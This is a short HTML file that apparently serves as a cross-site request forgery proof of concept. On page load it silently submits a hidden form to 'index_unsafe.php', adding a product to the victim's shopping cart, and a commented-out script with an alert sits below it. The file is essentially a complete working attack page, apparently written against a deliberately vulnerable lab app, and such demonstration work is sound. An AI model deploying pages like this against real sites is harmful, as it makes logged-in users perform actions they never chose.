

<!-- load form and submit -->

<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Document</title>
  </head>
  <body onload="document.forms[0].submit()">

  <!-- change action index.php -->
<form action="index_unsafe.php" method="post" name="shopping_cart">
  <input type='hidden' name='product_id' value="1"/>
  <input type="hidden" name="add_to_cart" type="submit"/>
</form>


</body>
</html>
<!-- <script>

alert("hej!");
document.getElementById('shopping_cart').submit();


<script/> -->